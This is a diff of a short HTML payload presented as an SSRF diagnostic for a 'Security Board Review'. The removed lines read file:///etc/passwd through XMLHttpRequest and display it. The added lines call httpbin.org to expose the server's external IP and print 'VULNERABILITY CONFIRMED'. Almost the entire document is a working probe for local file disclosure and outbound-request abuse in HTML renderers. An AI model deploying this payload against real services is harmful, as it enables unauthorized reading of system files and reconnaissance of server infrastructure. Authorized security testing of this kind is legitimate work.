@@ -1,25 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Diagnostic Test</title>
+    <title>Network SSRF Diagnostic Test</title>
 </head>
 <body>
-    <div id="output">Testing file access...</div>
+    <h2>Security Board Review: Outbound Network Request Verification</h2>
+    <div id="status">Verifying server-side network capabilities...</div>
 
     <script>
         try {
             var xhr = new XMLHttpRequest();
-            // Attempt to read a standard, predictable system file path
-            xhr.open('GET', 'file:///etc/passwd', false); 
+            // Using a safe, public API that returns request headers in JSON format
+            xhr.open('GET', 'https://httpbin.org/ip', false); 
             xhr.send();
             
-            if (xhr.responseText) {
-                document.getElementById('output').innerText = xhr.responseText;
+            if (xhr.status === 200) {
+                var response = JSON.parse(xhr.responseText);
+                document.getElementById('status').innerHTML = 
+                    "<strong>VULNERABILITY CONFIRMED:</strong> INTERACTIVE SSRF ENABLED<br>" +
+                    "Server External IP Address: " + response.origin;
             } else {
-                document.getElementById('output').innerText = "File access returned empty response.";
+                document.getElementById('status').innerText = "Received non-200 status code: " + xhr.status;
             }
         } catch (e) {
-            document.getElementById('output').innerText = "Error accessing file: " + e.toString();
+            document.getElementById('status').innerText = "Network request failed: " + e.toString();
         }
     </script>
 </body>
